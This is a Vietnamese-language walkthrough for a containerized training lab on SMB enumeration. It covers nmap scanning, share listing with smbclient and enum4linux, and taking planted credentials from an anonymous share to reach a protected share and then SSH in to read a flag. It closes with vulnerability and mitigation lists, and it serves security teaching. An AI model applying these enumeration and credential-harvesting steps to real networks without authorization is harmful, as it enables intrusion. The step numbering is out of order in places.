# 🔓 Flow Khai Thác Lab SMB Enumeration - SecureCorp

## 📋 Tổng Quan

Flow này mô tả các bước khai thác trong lab SMB Enumeration với kịch bản **Internal Network Penetration Test**. Khác với các lab khác, bài này tập trung vào việc enumerate SMB shares và tìm credentials từ network shares.

---

## 🚀 Khởi Động Lab

Lab này sử dụng **dynamic flags** được generate tự động dựa trên:
- Ngày hiện tại (GMT+7 timezone)
- Email environment variable

### Cách 1: Sử dụng email mặc định (sysadmin@securecorp.com)
```bash
docker compose up -d
```

### Cách 2: Sử dụng email tùy chỉnh
```bash
EMAIL=student@university.edu docker compose up -d --build
```

**Lưu ý:** Mỗi lần thay đổi EMAIL phải rebuild container.

---

## 🎯 Flow Khai Thác

### 1. Khởi động lab và truy cập client container
**(Nguyên nhân: Bạn là pentester được thuê để test bảo mật internal network)**

```bash
docker exec -it smb_client bash
```

**Kết quả:** Banner hiển thị Victim IP và Hostname

### 2. Scan network để phát hiện SMB service
**(Nguyên nhân: Cần xác định các dịch vụ đang chạy trong internal network)**

```bash
nmap -p 445 smb-target
# hoặc scan nhiều ports
nmap -p 139,445,22,80 smb-target
```

**Kết quả:** SMB service đang chạy trên port 445

### 3. Enumerate SMB shares
**(Nguyên nhân: Cần liệt kê các shares có sẵn để tìm điểm vào)**

```bash
# Sử dụng smbclient
smbclient -L //smb-target -N

# Hoặc sử dụng enum4linux (chi tiết hơn)
enum4linux -a smb-target
```

**Kết quả:** 
- Share `documents` - public access (read-only)
- Share `config` - requires authentication
- Share `backup` - requires authentication

### 4. Access public share (documents) và lấy SMB credentials
**(Nguyên nhân: Public share có thể chứa thông tin hữu ích hoặc credentials để truy cập share protected)**

```bash
smbclient //smb-target/documents -N
```

Sau khi vào share:
```bash
ls
get readme.txt
exit
```

**Kết quả:** Tìm thấy file `readme.txt` chứa SMB credentials:

```text
SecureCorp Internal File Portal

[Public Notice]
Internal file shares are protected. Use the following temporary account to access the config share:
SMB Username: sysadmin
SMB Password: Sy54dm1n
```

→ Từ đây, bạn biết tài khoản SMB: `sysadmin / Sy54dm1n`.

### 5. Truy cập config share với SMB sysadmin/Sy54dm1n
**(Nguyên nhân: Đã có SMB credentials từ documents, dùng để truy cập share protected `config`)**

```bash
smbclient //smb-target/config -U sysadmin
# Password: Sy54dm1n
```

**Kết quả:** Login thành công vào share `config`.

### 6. Tìm SSH credentials trong config share (config.txt)
**(Nguyên nhân: Config share thường chứa system configuration và credentials)**

```bash
smbclient //smb-target/config -U sysadmin
# Password: Sy54dm1n

ls
get config.txt
exit
```

**Kết quả:** Tìm thấy file `config.txt` chứa:
```
SSH Credentials
Username: system
Password: 657sdfh85d
Host: smb-target
Port: 22
```

### 8. SSH login với credentials tìm được
**(Nguyên nhân: Đã có username và password hợp lệ từ SMB share)**

```bash
ssh system@smb-target
# Password: 657sdfh85d
```

**Kết quả:** Đăng nhập thành công với quyền user `system`

### 7. Đọc flag
**(Nguyên nhân: Flag có permissions 600 - chỉ owner đọc được)**

```bash
cat /home/system/flag.txt
```

**Kết quả:** `FLAG{<sha1_hash>}` (Flag được generate tự động mỗi ngày)

---

## 🔍 Tóm Tắt Nguyên Nhân Lỗ Hổng

| Hành Động | Nguyên Nhân |
|-----------|-------------|
| **SMB service exposed** | Internal network không có firewall rules đầy đủ |
| **Public share với hints** | Documents share cho phép anonymous access và chứa hints |
| **Username enumeration** | SMB cho phép enumerate users |
| **Weak password** | Password dễ đoán (`sysadmin`) + không có account lockout |
| **Credentials exposure** | Credentials lưu trong config share không được mã hóa |
| **SSH password auth enabled** | `PasswordAuthentication yes` trong sshd_config |
| **No rate limiting** | Không chặn sau nhiều failed attempts |

---

## ⚠️ Các Lỗ Hổng Chính

1. **Weak password** → Password dễ đoán (`sysadmin`)
2. **SMB public share** → Documents share cho phép anonymous access
3. **Credentials exposure** → Credentials lưu trong config share không được bảo vệ
4. **SSH password authentication enabled** → Cho phép password login
5. **Không có account lockout** → Không chặn sau nhiều failed attempts
6. **Username enumeration** → Có thể enumerate users qua SMB
7. **Information disclosure** → Hints trong public share

---

## 🛡️ Cách Phòng Chống

1. ✅ **Sử dụng strong passwords** → `B@rc3!0n@#2024$Tx9` thay vì `sysadmin`
2. ✅ **Disable anonymous access** → Không cho phép guest access trên SMB shares
3. ✅ **Encrypt sensitive files** → Mã hóa credentials trước khi lưu
4. ✅ **Access control** → Chỉ cho phép authorized users truy cập shares
5. ✅ **Disable SSH password authentication** → Chỉ dùng SSH keys
6. ✅ **Account lockout** → Lock account sau 3-5 failed attempts
7. ✅ **Network segmentation** → Không expose SMB ra internet công cộng
8. ✅ **Regular security audits** → Kiểm tra và xóa credentials trong shares
9. ✅ **Disable user enumeration** → Cấu hình SMB để không tiết lộ users
10. ✅ **SMB hardening** → Sử dụng SMB 3.0+ với encryption

---

**Flow này minh họa cách thực hiện internal network penetration test: enumerate SMB, tìm credentials, và gain access vào hệ thống.**
